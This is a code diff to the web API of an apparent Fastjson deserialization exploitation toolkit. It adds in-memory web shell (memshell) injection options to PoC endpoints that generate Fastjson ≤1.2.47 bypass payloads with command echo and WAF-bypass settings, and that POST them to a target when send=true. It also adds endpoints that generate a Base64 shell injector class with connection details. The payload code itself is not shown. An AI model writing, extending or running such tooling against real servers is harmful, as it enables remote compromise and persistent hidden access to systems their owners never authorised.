@@ -16,6 +16,7 @@ from fastjson_toolkit.api.schemas import (
     HealthResponse,
     LabStartRequest,
     LabStopRequest,
+    MemShellGenerateRequest,
     Poc1247Request,
     Poc1268Request,
     Poc1280Request,
@@ -483,7 +484,8 @@ def create_app() -> FastAPI:
         summary="Fastjson ≤1.2.47 缓存绕过证明 PoC",
         description=(
             "生成 Class 缓存绕过 payload（JdbcRowSet / BCEL+dbcp / C3P0 / MyBatis / H2）。"
-            "echo=true 时为 BCEL/H2/MyBatis 自动生成回显类。"
+            "echo=true 时为 BCEL/H2/MyBatis 自动生成回显类；"
+            "memshell=true 时注入内存马（与 echo 互斥）。"
             "默认只生成；send=true 时 POST 到 target（授权测试）。"
         ),
     )
@@ -509,6 +511,13 @@ def create_app() -> FastAPI:
             engine=req.engine,  # type: ignore[arg-type]
             cmd=req.cmd,
             cmd_header=req.cmd_header,
+            memshell=req.memshell,
+            ms_api=req.ms_api,
+            ms_server=req.ms_server,
+            ms_tool=req.ms_tool,
+            ms_type=req.ms_type,
+            ms_path=req.ms_path,
+            ms_jdk=req.ms_jdk,
             waf_techniques=list(req.waf_techniques or []),
             waf_options=req.waf_options,
             target=req.target,
@@ -573,6 +582,13 @@ def create_app() -> FastAPI:
             cmd=req.cmd,
             cmd_header=req.cmd_header,
             attack_base=req.attack_base,
+            memshell=req.memshell,
+            ms_api=req.ms_api,
+            ms_server=req.ms_server,
+            ms_tool=req.ms_tool,
+            ms_type=req.ms_type,
+            ms_path=req.ms_path,
+            ms_jdk=req.ms_jdk,
             waf_techniques=list(req.waf_techniques or []),
             waf_options=req.waf_options,
             target=req.target,
@@ -633,6 +649,13 @@ def create_app() -> FastAPI:
             cmd=req.cmd,
             cmd_header=req.cmd_header,
             attack_base=req.attack_base,
+            memshell=req.memshell,
+            ms_api=req.ms_api,
+            ms_server=req.ms_server,
+            ms_tool=req.ms_tool,
+            ms_type=req.ms_type,
+            ms_path=req.ms_path,
+            ms_jdk=req.ms_jdk,
             waf_techniques=list(req.waf_techniques or []),
             waf_options=req.waf_options,
             target=req.target,
@@ -815,6 +838,54 @@ def create_app() -> FastAPI:
             return run_cve_2026_16723(opts)
         except Exception as exc:  # noqa: BLE001
             raise HTTPException(status_code=502, detail=f"PoC 执行失败: {exc}") from exc
+
+    @app.get(
+        "/api/memshell/config",
+        tags=["poc"],
+        summary="内存马 server/tool/type 配置矩阵",
+        description="默认走内置 memshell-gen.jar；backend 可传 http(s)://... 回退 boot。",
+    )
+    def memshell_config(backend: str = "jar") -> dict[str, Any]:
+        from fastjson_toolkit.poc.memshell import fetch_config
+
+        try:
+            return fetch_config(backend)
+        except Exception as exc:  # noqa: BLE001
+            raise HTTPException(
+                status_code=502, detail=f"读取 memshell config 失败: {exc}"
+            ) from exc
+
+    @app.post(
+        "/api/memshell/generate",
+        tags=["poc"],
+        summary="独立生成内存马 injector",
+        description="返回 injector Base64 与连接信息；不经 Fastjson 投递链。",
+    )
+    def memshell_generate_api(req: MemShellGenerateRequest) -> dict[str, Any]:
+        from fastjson_toolkit.poc.memshell import generate_memshell
+
+        try:
+            ms = generate_memshell(
+                backend=req.backend,
+                server=req.server,
+                tool=req.tool,
+                shell_type=req.shell_type,
+                url_pattern=req.path,
+                jdk=req.jdk,
+                static_initialize=req.static_initialize,
+            )
+        except Exception as exc:  # noqa: BLE001
+            raise HTTPException(
+                status_code=502, detail=f"生成内存马失败: {exc}"
+            ) from exc
+        return {
+            "ok": True,
+            "memshell_info": ms.as_info_dict(),
+            "memshell_connect": ms.connect_info,
+            "injector_b64": ms.injector_b64,
+            "injector_class": ms.injector_class,
+            "shell_class": ms.shell_class,
+        }
 
     return app
 
